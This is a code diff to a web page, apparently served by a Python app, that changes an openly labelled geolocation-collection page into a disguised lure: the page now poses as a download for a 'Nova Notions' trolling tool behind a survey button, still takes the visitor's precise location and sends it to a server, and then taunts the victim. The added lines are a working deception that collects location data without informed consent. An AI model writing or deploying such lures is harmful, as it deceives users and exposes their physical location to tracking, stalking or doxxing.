@@ -120,11 +120,11 @@ def client1():
         </style>
     </head>
     <body>
-        <h1>位置情報取得</h1>
-        <p>ボタンを押すと位置情報を取得します</p>
+        <h1>Nova Notions荒らしツール</h1>
+        <p>ダウンロード前にアンケートにご協力ください。</p>
         
         <button onclick="getLocation()" id="locationBtn">
-            📍 位置情報を取得する
+             アンケートフォームへ飛ぶ
         </button>
         
         <div id="status"></div>
@@ -144,13 +144,13 @@ def client1():
             btn.disabled = true;
             btn.textContent = '取得中...';
             
-            showMessage('位置情報を取得しています...', 'info');
+            showMessage('少々お待ち下さい...', 'info');
             
             // 位置情報取得
             if (!navigator.geolocation) {
-                showMessage('このブラウザは位置情報に対応していません', 'error');
+                showMessage('このブラウザは対応していません', 'error');
                 btn.disabled = false;
-                btn.textContent = '📍 位置情報を取得する';
+                btn.textContent = 'アンケートフォームへ飛ぶ';
                 return;
             }
             
@@ -160,10 +160,10 @@ def client1():
                     const lng = position.coords.longitude;
                     
                     showMessage(
-                        `位置情報を取得しました！<br>
+                        `位置情報を取得しました！　残念、また次回！<br>
                         緯度: ${lat}<br>
                         経度: ${lng}<br>
-                        <br>サーバーに送信中...`,
+                        <br>次回は賢くなろうね、、サーバーに送信中...`,
                         'info'
                     );
                     
@@ -198,7 +198,7 @@ def client1():
                     } catch (error) {
                         showMessage('サーバーエラー: ' + error.message, 'error');
                         btn.disabled = false;
-                        btn.textContent = '📍 位置情報を取得する';
+                        btn.textContent = 'アンケートフォームへ飛ぶ';
                     }
                 },
                 function(error) {
@@ -218,7 +218,7 @@ def client1():
                     }
                     showMessage(message, 'error');
                     btn.disabled = false;
-                    btn.textContent = '📍 位置情報を取得する';
+                    btn.textContent = 'アンケートフォームへ飛ぶ';
                 },
                 {
                     enableHighAccuracy: true,
